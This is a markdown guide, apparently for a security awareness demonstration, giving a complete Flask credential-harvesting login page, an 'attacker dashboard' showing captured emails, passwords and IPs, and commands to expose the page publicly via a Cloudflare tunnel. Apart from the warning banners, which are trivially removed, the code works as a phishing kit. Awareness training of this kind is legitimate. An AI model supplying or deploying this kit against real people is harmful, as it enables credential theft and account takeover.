# Phishing Awareness Demo — Flask + Cloudflare Tunnel

## Complete Flask App (`app.py`)

Save this as `~/phishing-demo/app.py`.

```python
#!/usr/bin/env python3
"""
PHISHING AWARENESS DEMO — Educational Purpose Only
Shows how credential harvesting works in a controlled lab environment.
Only use with YOUR OWN test credentials.
"""

from flask import Flask, request, render_template_string, redirect, jsonify
import datetime
import os

app = Flask(__name__)

LOG_FILE = "captured_creds.txt"
DASHBOARD_PASSWORD = "demo123"  # Change this for your demo

LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Portal — Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .card {
            background: white; border-radius: 16px; padding: 40px; width: 400px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { font-size: 24px; color: #333; }
        .logo p { color: #888; font-size: 14px; margin-top: 5px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 6px; color: #555; font-size: 14px; font-weight: 600; }
        input[type="text"], input[type="password"] {
            width: 100%; padding: 12px 16px; border: 2px solid #e0e0e0; border-radius: 8px;
            font-size: 15px; transition: border 0.2s;
        }
        input:focus { border-color: #667eea; outline: none; }
        .btn {
            width: 100%; padding: 12px; background: #667eea; color: white; border: none;
            border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer;
            transition: background 0.2s;
        }
        .btn:hover { background: #5a6fd8; }
        .alert-bar {
            background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px;
            margin-bottom: 20px; font-size: 13px; text-align: center; border: 1px solid #ffeeba;
        }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #aaa; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <h1>Secure Portal</h1>
            <p>Sign in to your account</p>
        </div>

        <div class="alert-bar">
            SECURITY AWARENESS DEMO: This page simulates a credential harvesting
            attack. Any credentials entered here are captured for demonstration.
            Use TEST credentials only.
        </div>

        <form method="POST" action="/login">
            <div class="form-group">
                <label for="email">Email / Username</label>
                <input type="text" id="email" name="email" placeholder="you@example.com" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter password" required>
            </div>
            <button type="submit" class="btn">Sign In</button>
        </form>
        <div class="footer">
            <p>Protected by SSL encryption</p>
            <p style="margin-top:5px;color:#dc3545;font-weight:bold;">
              THIS IS A PHISHING SIMULATION — No real credentials!
            </p>
        </div>
    </div>
</body>
</html>
"""

ERROR_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Error</title>
<style>
    body{font-family:sans-serif;text-align:center;padding:80px 20px;background:#f8f9fa}
    h1{color:#e74c3c;font-size:32px}
    p{color:#666;margin-top:20px;font-size:16px}
    .box{background:white;max-width:500px;margin:0 auto;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.1)}
</style></head>
<body>
    <div class="box">
        <h1>Session Expired</h1>
        <p>Your session has timed out. Please close this page and try again.</p>
        <p style="margin-top:30px;font-size:12px;color:#999;">
            This is a simulated phishing page used for security awareness training.
        </p>
    </div>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(LOGIN_PAGE)


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = (
        f"\n[{timestamp}] CAPTURED CREDENTIALS\n"
        f"  |- IP:       {ip}\n"
        f"  |- Email:    {email}\n"
        f"  |- Password: {password}\n"
        f"  |- UA:       {user_agent[:80]}\n"
        f"  +-- End ----"
    )

    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

    print(log_entry)
    return render_template_string(ERROR_PAGE)


@app.route("/dashboard")
def dashboard():
    auth = request.args.get("key", "")
    if auth != DASHBOARD_PASSWORD:
        return """
        <html><body style="font-family:sans-serif;padding:40px;background:#1a1a2e;color:white;">
        <h2>Attacker Dashboard (Protected)</h2>
        <form method="GET">
            <p>Access key: <input type="password" name="key" style="padding:8px;width:200px;">
            <input type="submit" value="View"
              style="padding:8px 20px;background:#e94560;color:white;border:none;border-radius:4px;cursor:pointer;">
            </p>
        </form>
        </body></html>
        """

    if not os.path.exists(LOG_FILE):
        return "<html><body style='padding:40px;background:#1a1a2e;color:white;font-family:sans-serif;'><h2>No credentials captured yet</h2></body></html>"

    with open(LOG_FILE, "r") as f:
        data = f.read()

    count = data.count("CAPTURED CREDENTIALS")
    return f"""
    <html><body style="padding:40px;background:#1a1a2e;color:white;font-family:monospace;">
    <h2 style="color:#e94560;font-family:sans-serif;">ATTACKER DASHBOARD — Captured Credentials</h2>
    <p style="color:#888;font-size:12px;font-family:sans-serif;">
    This is the attacker's view. In a real attack, harvested credentials
    would be exfiltrated to a remote server.
    </p>
    <hr style="border-color:#333;">
    <pre style="background:#16213e;padding:20px;border-radius:8px;white-space:pre-wrap;">{data}</pre>
    <p style="color:#888;font-size:11px;font-family:sans-serif;">
    Total captures: {count}
    </p>
    </body></html>
    """


@app.route("/clear", methods=["POST"])
def clear():
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    return jsonify({"status": "cleared"})


if __name__ == "__main__":
    print("""
    SECURITY AWARENESS DEMO
    =======================
    LOCAL:     http://localhost:5000
    DASHBOARD: http://localhost:5000/dashboard?key=demo123
    TUNNEL:    Run: cloudflared tunnel --url http://localhost:5000
    """)
    app.run(host="0.0.0.0", port=5000, debug=False)
```

## One-Command Demo Setup

```bash
# Create project
mkdir -p ~/phishing-demo && cd ~/phishing-demo
# Save app.py from above

# Install cloudflared
curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
  -o ~/.local/bin/cloudflared && chmod +x ~/.local/bin/cloudflared

# Start Flask (background)
python3 app.py &
sleep 2

# Expose via tunnel
cloudflared tunnel --url http://localhost:5000
# Look for: https://<random>.trycloudflare.com
```

## Demo Day Checklist

- [ ] Flask server running (`curl http://localhost:5000` returns 200)
- [ ] Tunnel URL working (open in browser externally)
- [ ] Dashboard password set (default: `demo123`)
- [ ] `captured_creds.txt` cleared from prior demos
- [ ] Victim phone/device ready to visit URL
- [ ] Test: submit fake creds -> verify they appear in dashboard
- [ ] Told audience: "Do not enter real credentials"

## Controls Reference

| Action | Command |
|:-------|:--------|
| View tunnel URL | Check terminal output, or `cat tunnel_url.log` |
| View captured creds | `cat ~/phishing-demo/captured_creds.txt` |
| Clear captured data | `curl -X POST http://localhost:5000/clear` |
| Stop Flask | `kill $(lsof -ti:5000)` |
| Stop tunnel | Ctrl+C or `kill $(pgrep cloudflared)` |
| Restart with changes | `kill $(lsof -ti:5000) && python3 app.py &` |
